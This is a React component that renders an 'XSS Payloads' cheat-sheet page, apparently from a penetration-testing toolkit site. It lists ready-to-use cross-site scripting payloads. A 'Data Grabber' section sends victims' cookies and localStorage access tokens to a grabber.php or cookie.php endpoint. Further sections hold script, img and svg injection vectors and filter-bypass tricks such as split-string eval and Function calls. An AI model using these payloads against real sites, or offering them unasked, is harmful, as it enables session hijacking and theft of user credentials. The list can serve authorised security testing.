import React, { useState } from 'react';
import { PayloadBlock } from '../../../components/ui';

export default function XSSPayloads() {
    const DataGrabber = [
        { title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>" },
        { title: "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>" },
        { title: "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>" },
        { title: "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>" },
    ];
    const BasicXSS = [
        { title: "<script>alert('XSS')</script>" },
        { title: "<scr<script>ipt>alert('XSS')</scr<script>ipt>" },
        { title: "\"><script>alert(\"XSS\")</script>" },
        { title: "\"><script>alert(String.fromCharCode(88,83,83))</script>" },
    ];
    const ImgPayload = [
        { title: "<img src=x onerror=alert('XSS');>" },
        { title: "<img src=x onerror=alert('XSS')//" },
        { title: "<img src=x onerror=alert(String.fromCharCode(88,83,83));>" },
        { title: "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>" },
        { title: "<img src=x:alert(alt) onerror=eval(src) alt=xss>" },
        { title: "\"><img src=x onerror=alert(\"XSS\");>" },
    ];
    const XSSSvg = [
        { title: "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>" },
        { title: "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>" },
        { title: "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>" },
    ];
    const BypassWord = [
        { title: "eval('ale'+'rt(0)');" },
        { title: "Function('ale'+'rt(1)')();" },
        { title: "new Function`alert`6``;" },
        { title: "setTimeout('ale'+'rt(2)');" },
        { title: "setInterval('ale'+'rt(10)');" },
    ];

    const PayloadSection = ({ title, payloads }: { title: string, payloads: { title: string }[] }) => (
        <div className="mb-6">
            <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
                {title}
            </h3>
            <PayloadBlock
                content={payloads.map(p => p.title).join('\n')}
            />
        </div>
    );

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white">XSS Payloads</h2>
                <p className="text-gray-400">XSS payload templates for filter bypass and code execution.</p>
            </div>
            <PayloadSection title="Data Grabber" payloads={DataGrabber} />
            <PayloadSection title="Basic XSS" payloads={BasicXSS} />
            <PayloadSection title="Image Vectors" payloads={ImgPayload} />
            <PayloadSection title="SVG Vectors" payloads={XSSSvg} />
            <PayloadSection title="Filter Bypass" payloads={BypassWord} />
        </div>
    );
}
